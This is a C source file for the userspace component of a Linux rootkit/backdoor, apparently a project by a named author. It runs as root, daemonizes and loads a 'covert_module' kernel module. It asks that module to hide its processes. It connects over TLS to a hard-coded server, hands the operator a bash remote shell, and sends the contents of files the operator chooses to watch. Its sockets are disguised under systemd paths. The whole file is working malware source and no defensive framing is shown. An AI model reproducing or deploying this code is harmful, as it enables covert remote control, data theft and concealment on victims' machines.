/*
 * Author and Designer: John Agapeyev
 * Date: 2018-10-19
 * Notes:
 * The socket handling for userspace
 */

#define _GNU_SOURCE

//Needed for NAME_MAX constant
#define _POSIX_C_SOURCE 200809L

#include <asm/types.h>
#include <assert.h>
#include <fcntl.h>
#include <limits.h>
#include <linux/tcp.h>
#include <netinet/ip.h>
#include <openssl/err.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/ssl.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/fcntl.h>
#include <sys/inotify.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/un.h>
#include <unistd.h>

#include "crypto.h"
#include "shared.h"

#ifndef UNIX_SOCK_PATH
#define UNIX_SOCK_PATH ("/run/systemd/system/stdout")
#endif
#ifndef SHELL_SOCK_PATH
#define SHELL_SOCK_PATH ("/run/systemd/system/bus")
#endif

struct inot_watch {
    int wd;
    char name[NAME_MAX + 1];
};

unsigned char buffer[MAX_PAYLOAD + 1];

int conn_sock = -1;
int remote_shell_sock = -1;
int local_socks[2];

//int inot_fd = -1;
int* inot_fd;
int inot_epoll = -1;
struct inot_watch* inot_wds;
size_t* inot_watch_count;

#define finit_module(fd, param_values, flags) syscall(__NR_finit_module, fd, param_values, flags)

/*
 * function:
 *    wrapped_fork
 *
 * return:
 *    pid_t
 *
 * parameters:
 *    void
 *
 * notes:
 * Simple wrapper around fork call
 */
pid_t wrapped_fork(void) {
    pid_t pid;
    if ((pid = fork()) == -1) {
        perror("fork()");
        exit(EXIT_FAILURE);
    }
    return pid;
}

void* wrapped_mmap(size_t size) {
    void* out = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);

    if (out == MAP_FAILED) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }
    return out;
}

void hide_proc(void) {
    unsigned char buf[30];
    memset(buf, 0, 30);
    sprintf((char*) buf, "hide %d", getpid());
    printf("Writing %s to module on process start\n", buf);
    write(conn_sock, buf, strlen((char*) buf));
}

/*
 * function:
 *    run_remote_shell
 *
 * return:
 *    void
 *
 * parameters:
 *    void
 *
 * notes:
 * Connects to unix socket, and establishes it as input for standard streams before execing bash
 */
void run_remote_shell(void) {
    int remote_sock = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, SHELL_SOCK_PATH);

    errno = 0;

    if (connect(remote_sock, (struct sockaddr*) &su, sizeof(struct sockaddr_un))) {
        perror("connect");
        printf("%d\n", errno);
        exit(EXIT_FAILURE);
    }
    printf("connect %d\n", remote_sock);

    printf("shell running\n");

    if (wrapped_fork()) {
        exit(EXIT_SUCCESS);
    }
    setsid();

    sleep(1);

    hide_proc();

    dup2(remote_sock, 0);
    dup2(remote_sock, 1);
    dup2(remote_sock, 2);

    printf("Shell PID: %d\n", getpid());

    const char* sh[2];
    sh[0] = "/bin/bash";
    sh[1] = NULL;

    execve(sh[0], (char* const*) sh, 0);
}

/*
 * function:
 *    create_unix_socket
 *
 * return:
 *    int
 *
 * parameters:
 *    const char* sock_path
 *
 * notes:
 * Creates a unix socket based on a path
 */
int create_unix_socket(const char* sock_path) {
    int local_tls_socket = socket(AF_UNIX, SOCK_STREAM, 0);

    struct sockaddr_un su;
    memset(&su, 0, sizeof(struct sockaddr_un));
    su.sun_family = AF_UNIX;
    strcpy(su.sun_path, sock_path);

    unlink(sock_path);
    if (bind(local_tls_socket, (struct sockaddr*) &su, sizeof(struct sockaddr_un)) == -1) {
        perror("bind");
        return EXIT_FAILURE;
    }
    return local_tls_socket;
}

/*
 * function:
 *    create_remote_socket
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Creates a remote socket and connects it to the server
 */
int create_remote_socket(void) {
    int remote_sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sin;
    sin.sin_addr.s_addr = SERVER_IP;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(PORT);

    if (connect(remote_sock, (struct sockaddr*) &sin, sizeof(struct sockaddr_in))) {
        perror("remote connect");
        return EXIT_FAILURE;
    }
    return remote_sock;
}

/*
 * function:
 *    create_epoll_fd
 *
 * return:
 *    int
 *
 * parameters:
 *    void
 *
 * notes:
 * Wrapper around epoll_create1()
 */
int create_epoll_fd(void) {
    int efd;
    if ((efd = epoll_create1(0)) == -1) {
        perror("epoll_create1");
        exit(EXIT_FAILURE);
    }
    return efd;
}

/*
 * function:
 *    add_epoll_socket
 *
 * return:
 *    void
 *
 * parameters:
 *    const int epollfd
 *    const int sock
 *    struct epoll_event* ev
 *
 * notes:
 * Wrapper around epoll_ctl
 */
void add_epoll_socket(const int epollfd, const int sock, struct epoll_event* ev) {
    if (epoll_ctl(epollfd, EPOLL_CTL_ADD, sock, ev) == -1) {
        perror("epoll_ctl");
        exit(EXIT_FAILURE);
    }
}

/*
 * function:
 *    wait_for_epoll_event
 *
 * return:
 *    int
 *
 * parameters:
 *    const int epollfd
 *    struct epoll_event* events
 *
 * notes:
 * Wrapper around epoll_wait
 */
int wait_for_epoll_event(const int epollfd, struct epoll_event* events) {
    int nevents;
    if ((nevents = epoll_wait(epollfd, events, 100, -1)) == -1) {
        if (errno == EINTR) {
            //Interrupted by signal, ignore it
            return 0;
        }
        perror("epoll_wait");
        exit(EXIT_FAILURE);
    }
    return nevents;
}

int create_inotify_descriptor(void) {
    int fd = inotify_init1(IN_CLOEXEC);
    if (fd < 0) {
        perror("inotify_init1");
        exit(EXIT_FAILURE);
    }
    return fd;
}

void promote_child(void) {
    if (wrapped_fork()) {
        exit(EXIT_SUCCESS);
    }
    setsid();
}

void add_read_socket_epoll(int efd, int sock) {
    struct epoll_event ev;
    ev.events = EPOLLIN | EPOLLET | EPOLLEXCLUSIVE;
    ev.data.fd = sock;
    add_epoll_socket(efd, sock, &ev);
}

void epoll_event_loop(SSL* ssl) {
    int efd = create_epoll_fd();
    struct epoll_event* eventList = calloc(100, sizeof(struct epoll_event));

    add_read_socket_epoll(efd, conn_sock);
    add_read_socket_epoll(efd, remote_shell_sock);
    add_read_socket_epoll(efd, local_socks[0]);

    hide_proc();

    for (;;) {
        int n = wait_for_epoll_event(efd, eventList);
        //n can't be -1 because the handling for that is done in wait_for_epoll_event
        assert(n != -1);
        for (int i = 0; i < n; ++i) {
            if (eventList[i].events & EPOLLERR || eventList[i].events & EPOLLHUP) {
                fprintf(stderr, "Sock error\n");
                close(eventList[i].data.fd);
            } else if (eventList[i].events & EPOLLIN) {
                int size;
                while ((size = read(eventList[i].data.fd, buffer, MAX_PAYLOAD)) > 0) {
                    printf("Read %d bytes\n", size);
                    printf("Wrote %d bytes to server\n", size);
                    if (eventList[i].data.fd == remote_shell_sock) {
                        memmove(buffer + 1, buffer, size);
                        buffer[0] = 's';
                        SSL_write(ssl, buffer, size + 1);
                    } else if (eventList[i].data.fd == conn_sock
                            && memcmp(buffer, "foobar", 6) == 0) {
                        //Kernel is telling userspace to unload the kernel module
                        //system("modprobe -rf covert_module");
                        system("rmmod covert_module");
                    } else {
                        SSL_write(ssl, buffer, size);
                    }
                }
                if (size == 0) {
                    goto done;
                }
                if (size == -1) {
                    if (errno != EAGAIN) {
                        perror("read");
                        goto done;
                    }
                }
            }
        }
    }
done:
    free(eventList);
}

void handle_inotify_create(struct inotify_event* ie) {
    printf("%s was created\n", ie->name);
    int wd;
    if ((wd = inotify_add_watch(*inot_fd, ie->name, IN_CLOSE_WRITE | IN_IGNORED)) < 0) {
        perror("inotify_add_watch create");
        exit(EXIT_FAILURE);
    }
    //Save watch descriptor
    inot_wds[*inot_watch_count].wd = wd;
    strcpy(inot_wds[*inot_watch_count].name, ie->name);
    ++(*inot_watch_count);
}

void handle_inotify_ignore(struct inotify_event* ie) {
    for (size_t j = 0; j < *inot_watch_count; ++j) {
        if (inot_wds[j].wd == ie->wd) {
            //Found the watch descriptor, re-add it
            int wd;

            if ((wd = inotify_add_watch(
                         *inot_fd, inot_wds[j].name, IN_CLOSE_WRITE | IN_IGNORED))
                    < 0) {
                perror("read inotify_add_watch");
                exit(EXIT_FAILURE);
            }

            //Save watch descriptor
            inot_wds[j].wd = wd;
        }
    }
}

int handle_inotify_modified(struct inotify_event* ie) {
    //printf("%s was modified\n", ie->name);
    const char* file_name = NULL;
    if (ie->len > 0) {
        printf("Grabbing name directly of length %d\n", ie->len);
        //We have a name
        file_name = ie->name;
    } else {
        //Retrieve the name
        printf("Watch count %lu\n", *inot_watch_count);
        for (size_t j = 0; j < *inot_watch_count; ++j) {
            printf("Looking for file watch name: %s\n", inot_wds[j].name);
            if (inot_wds[j].wd == ie->wd) {
                //Found our name
                file_name = inot_wds[j].name;
                break;
            }
        }
    }
    if (!file_name) {
        printf("Failed to get filename for the modified file\n");
        return -1;
    }
    //Time to write the file contents to the server
    FILE* f = fopen(file_name, "r");
    if (!f) {
        fprintf(stderr, "%s\n", file_name);
        perror("inotify fopen");
        return -1;
    }
    fseek(f, 0, SEEK_END);
    size_t file_size = ftell(f);
    rewind(f);

    //unsigned char* file_buffer = malloc(file_size + 1);
    unsigned char file_buffer[MAX_PAYLOAD];
    file_buffer[0] = 'f';
    size_t size;
    while ((size = fread(file_buffer + 1, 1, MAX_PAYLOAD - 1, f)) > 0) {
        if (size < (MAX_PAYLOAD - 1)) {
            //Last chunk of file, or small file in its entirety
            file_buffer[0] = 'r';
        }
        //Write to server via local socket listening in epoll
        write(local_socks[1], file_buffer, size + 1);
        printf("Wrote file data to the server\n");
    }
    return 0;
}

void unwatch_inotify(void) {
    //Unregister all inotify handles here
    for (size_t i = 0; i < *inot_watch_count; ++i) {
        printf("Removing inotify watch\n");
        inotify_rm_watch(*inot_fd, inot_wds[i].wd);
    }
    *inot_watch_count = 0;
}

void inotify_event_loop(void) {
    unsigned char buf[(sizeof(struct inotify_event) + NAME_MAX + 1) * 8192];
    struct inotify_event* ie = (struct inotify_event*) buf;

    for (;;) {
        errno = 0;
        int s = read(*inot_fd, buf, sizeof(buf));
        if (s < 0 && errno != EAGAIN) {
            perror("inotify_epoll_read");
            exit(EXIT_FAILURE);
        }
        if (errno == EAGAIN) {
            continue;
        }
        struct inotify_event* ie_tmp = ie;
        while (s > 0) {
            if (ie_tmp->mask & IN_Q_OVERFLOW) {
                printf("inotify queue overflow\n");
            }
            //handle updated log file
            if (ie_tmp->mask & IN_CLOSE_WRITE) {
                if (handle_inotify_modified(ie_tmp) < 0) {
                    continue;
                }
            } else if (ie_tmp->mask & IN_CREATE) {
                handle_inotify_create(ie_tmp);
            } else if (ie_tmp->mask & IN_IGNORED) {
                handle_inotify_ignore(ie_tmp);
            }
            printf("Old s %d\n", s);
            s -= sizeof(struct inotify_event) + ie_tmp->len;
            printf("New s %d\n", s);
            ie_tmp = (struct inotify_event*) (((unsigned char*) ie_tmp)
                    + sizeof(struct inotify_event) + ie_tmp->len);
        }
    }
}

void ssl_read_event_loop(SSL* ssl) {
    //Read
    for (;;) {
        int size = SSL_read(ssl, buffer, MAX_PAYLOAD);
        printf("Read %d from server\n", size);
        if (size < 0) {
            perror("SSL_read");
            break;
        } else if (size == 0) {
            break;
        }
        if (buffer[0] == '!') {
            if (size >= 7 && strncmp("watch", (char*) (buffer + 1), 5) == 0) {
                //Register inotify handle here

                //Clear newline character from path
                buffer[strlen((char*) buffer) - 1] = '\0';
                int wd;
                if ((wd = inotify_add_watch(*inot_fd, (char*) (buffer + 7),
                             IN_CLOSE_WRITE | IN_ATTRIB | IN_IGNORED))
                        < 0) {
                    perror("inotify_add_watch");
                    //exit(EXIT_FAILURE);

                    strcpy((char*) buffer, "Bad inotify path");
                    write(remote_shell_sock, buffer, strlen((char*) buffer));
                    continue;
                }
                //Save watch descriptor
                inot_wds[*inot_watch_count].wd = wd;
                strcpy(inot_wds[*inot_watch_count].name, (char*) (buffer + 7));
                ++(*inot_watch_count);
            } else if (strncmp("unwatch", (char*) (buffer + 1), 7) == 0) {
                unwatch_inotify();
            } else {
                printf("Wrote %d to kernel module\n", size);
                write(conn_sock, buffer + 1, size - 1);
            }
        } else {
            printf("Wrote %d to remote shell\n", size);
            //Pass message to shell process
            write(remote_shell_sock, buffer, size);
        }
        memset(buffer, 0, MAX_PAYLOAD);
    }
}

/*
 * function:
 *    main
 *
 * return:
 *    int
 *
 * parameters:
 *    int argc
 *    char** argv
 *
 * notes:
 * Establishes a TLS session, forks into read and write processes, and forwards packets
 */
int main(void) {
    if (setuid(0)) {
        perror("setuid");
        exit(EXIT_FAILURE);
    }
    if (setgid(0)) {
        perror("setgid");
        exit(EXIT_FAILURE);
    }

    //Daemonize
    promote_child();

    init_openssl();
    SSL_CTX* ctx = create_context();
    configure_context(ctx);

    int local_tls_socket = create_unix_socket(UNIX_SOCK_PATH);
    int remote_shell_unix = create_unix_socket(SHELL_SOCK_PATH);

    listen(local_tls_socket, 5);
    listen(remote_shell_unix, 5);

    inot_wds = wrapped_mmap(sizeof(struct inot_watch) * (1ul << 16));
    inot_watch_count = wrapped_mmap(sizeof(size_t));
    *inot_watch_count = 0;

    inot_fd = wrapped_mmap(sizeof(int));
    *inot_fd = create_inotify_descriptor();

    //Load module from userspace
    int module = open("covert_module.ko", O_RDONLY);
    finit_module(module, "\0", 0);
    close(module);

    conn_sock = accept(local_tls_socket, NULL, 0);
    fcntl(conn_sock, F_SETFL, fcntl(conn_sock, F_GETFL, 0) | O_NONBLOCK);

    //Close after the unix socket accepts the connection
    close(local_tls_socket);

    int remote_sock = create_remote_socket();

    inot_epoll = create_epoll_fd();

    SSL* ssl = SSL_new(ctx);
    SSL_set_fd(ssl, remote_sock);

    if (SSL_connect(ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        return EXIT_FAILURE;
    }

    //Disable Nagle's algorithm
    setsockopt(remote_sock, IPPROTO_TCP, TCP_NODELAY, &(int){1}, sizeof(int));

    unsigned char tmp_buf[20];
    memset(tmp_buf, 0xfe, 20);
    SSL_write(ssl, tmp_buf, 20);

    if (!wrapped_fork()) {
        run_remote_shell();
    } else {
        promote_child();
        remote_shell_sock = accept(remote_shell_unix, NULL, 0);
        fcntl(remote_shell_sock, F_SETFL, fcntl(remote_shell_sock, F_GETFL, 0) | O_NONBLOCK);

        close(remote_shell_unix);

        printf("accept %d\n", remote_shell_sock);
    }

    promote_child();

    //if (socketpair(AF_UNIX, SOCK_STREAM, 0, local_socks) < 0) {
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, local_socks) < 0) {
        perror("socketpair");
        exit(EXIT_FAILURE);
    }
    fcntl(local_socks[0], F_SETFL, fcntl(local_socks[0], F_GETFL, 0) | O_NONBLOCK);
    fcntl(local_socks[1], F_SETFL, fcntl(local_socks[1], F_GETFL, 0) | O_NONBLOCK);

    if (!wrapped_fork()) {
        promote_child();
        epoll_event_loop(ssl);
    } else {
        setsid();

        //See if I can remove unix socket files after connection
        unlink(UNIX_SOCK_PATH);

        if (wrapped_fork()) {
            setsid();
            hide_proc();
            ssl_read_event_loop(ssl);
        } else {
            setsid();
            hide_proc();
            inotify_event_loop();
        }
    }

    puts("Userspace process exited\n");
    close(conn_sock);
    close(remote_shell_sock);

    close(local_tls_socket);
    close(remote_shell_unix);

    close(*inot_fd);
    close(inot_epoll);

    unlink(UNIX_SOCK_PATH);

    SSL_free(ssl);

    close(remote_sock);

    SSL_CTX_free(ctx);

    cleanup_openssl();

    return EXIT_SUCCESS;
}
